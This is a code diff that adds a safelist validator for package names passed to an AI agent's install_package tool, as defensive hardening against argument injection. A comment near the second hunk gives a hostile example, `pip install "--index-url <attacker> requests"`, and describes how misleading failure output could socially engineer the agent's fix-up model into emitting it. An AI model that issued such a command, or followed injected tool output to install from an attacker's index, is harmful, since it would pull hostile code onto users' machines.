@@ -29,6 +29,46 @@ def _truncate(text: str, limit: int = 2000) -> str:
     return text
 
 
+# R2-6: PEP 508 + npm spec safelists for install_package. A regex safelist is
+# stronger than a denylist because anything outside the grammar — whitespace,
+# `--index-url`, `;`, `|`, `&`, backticks, $, shell metas — is rejected by
+# virtue of not matching. We're not running pip/npm/uv through a shell, so
+# `>` inside `requests>=2.0` is harmless on the subprocess.run(list) path —
+# but a leading `-` would still be parsed by pip as a flag, hence the
+# explicit early-reject.
+_PEP508_SPEC_RE = re.compile(
+    r"^[A-Za-z0-9][A-Za-z0-9._-]*"
+    r"(\[[A-Za-z0-9_,.\-]+\])?"
+    r"((==|>=|<=|!=|~=|>|<)[A-Za-z0-9._*+!-]+"
+    r"(,(==|>=|<=|!=|~=|>|<)[A-Za-z0-9._*+!-]+)*)?$"
+)
+_NPM_SPEC_RE = re.compile(
+    r"^(@[A-Za-z0-9._-]+/)?[A-Za-z0-9][A-Za-z0-9._-]*(@[A-Za-z0-9._-]+)?$"
+)
+
+
+def _validate_package_spec(spec: str, manager: str) -> str | None:
+    """Return None if spec is safe to pass to pip/npm/uv, else an error message."""
+    s = (spec or "").strip()
+    if not s:
+        return "Empty package spec"
+    if s.startswith("-"):
+        return f"Package spec must not start with '-' (would be parsed as a flag): {spec!r}"
+    if manager in ("pip", "uv"):
+        if not _PEP508_SPEC_RE.match(s):
+            return (
+                f"Invalid pip/uv package spec: {spec!r} — "
+                f"must be a PEP 508 name (e.g. 'requests', 'requests>=2.0', 'requests[crypto]==2.31.0')"
+            )
+    elif manager in ("npm", "node"):
+        if not _NPM_SPEC_RE.match(s):
+            return (
+                f"Invalid npm package spec: {spec!r} — "
+                f"must be 'name', '@scope/name', or 'name@version'"
+            )
+    return None
+
+
 def _valid_cwd(cwd: str | None) -> str | None:
     if not cwd:
         return None
@@ -597,6 +637,13 @@ def _handle_code_execution(action: str, params: dict) -> dict:
         if not package:
             return _err("No package name provided")
         manager = (params.get("manager") or "pip").lower()
+        # R2-6: gatekeep BEFORE subprocess — Sonnet's _attempt_fix could be
+        # socially-engineered into emitting `pip install "--index-url <attacker> requests"`
+        # if the failure output looked like a missing-index hint. PEP 508 /
+        # npm-spec safelist catches it.
+        spec_error = _validate_package_spec(package, manager)
+        if spec_error:
+            return _err(spec_error)
         if manager == "pip":
             pip_bin = Path(sys.executable).parent / ("pip.exe" if sys.platform == "win32" else "pip")
             if not pip_bin.exists():
